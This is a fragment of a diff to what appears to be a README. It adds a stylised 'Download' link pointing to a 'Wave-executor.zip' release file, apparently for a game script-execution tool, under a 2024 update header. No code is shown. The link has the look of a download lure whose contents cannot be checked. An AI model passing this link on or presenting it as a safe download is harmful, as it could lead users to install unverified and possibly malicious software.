@@ -2,7 +2,7 @@
 
 
 
-## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/medo1234gf/Wave-executor/releases/download/Wave-executor/Wave-executor.zip)***
 
 ## UPDATE 24.07.2024
 
